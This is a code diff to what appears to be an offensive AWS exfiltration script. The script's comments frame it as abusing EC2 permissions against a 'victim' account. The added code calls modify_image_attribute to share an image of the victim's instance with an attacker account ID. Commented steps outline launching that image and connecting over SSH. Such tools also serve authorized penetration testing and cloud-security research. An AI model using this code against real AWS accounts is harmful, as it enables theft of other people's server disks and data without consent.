@@ -21,6 +21,7 @@
 # CreateImage:
 #   Abuses:
 #       ec2:CreateImage
+#       ec2:ModifyImageAttribute
 #
 #   NOT FULLY IMPLEMENTED YET.
 #   For this technique, the procedure is following - the script will create an image out of specified victim's EC2 
@@ -351,13 +352,28 @@ To examine exfiltrated data:
         except Exception as e:
             Logger.fatal(f"ec2:CreateImage action on Victim failed. Exception: {e}")
 
-        # Step 2: Import custom SSH RSA public key
+        target_user = self.get_account_id('attacker')
+        Logger.out(f"Step 2: Modifying image attributes to share it with UserId = {target_user}")
+        try:
+            modify_result = victim_client.modify_image_attribute(
+                Attribute = 'launchPermission',
+                ImageId = created_image['ImageId'],
+                OperationType = 'add',
+                UserIds = [
+                    target_user,
+                ]
+            )
+            Logger.ok(f"Image's attributes modified to share it with user {target_user}")
+        except Exception as e:
+            Logger.fatal(f"ec2:ModifyImageAttribute action on Victim failed. Exception: {e}")
+
+        # Step 3: Import custom SSH RSA public key
         #          client.import_key_pair(
         #               KeyName = "Some key name"
         #               PublicKeyMaterial = "key material"
         #          )
 
-        # Step 3: Create an instance from exported AMI
+        # Step 4: Create an instance from exported AMI
         #          client.run_instances(
         #               ImageId = "ami-00000000",
         #               SecurityGroupIds = ["sg-00000", ],
@@ -370,7 +386,7 @@ To examine exfiltrated data:
         #         Returns:
         #               "i-00001111002222"
 
-        # Step 4: Connect to that EC2 instance
+        # Step 5: Connect to that EC2 instance
         #         client.describe_instances(
         #               InstanceIds = ["i-00001111002222"],
         #               Query = "Reservations[0].Instances[0].PublicIpAddress"
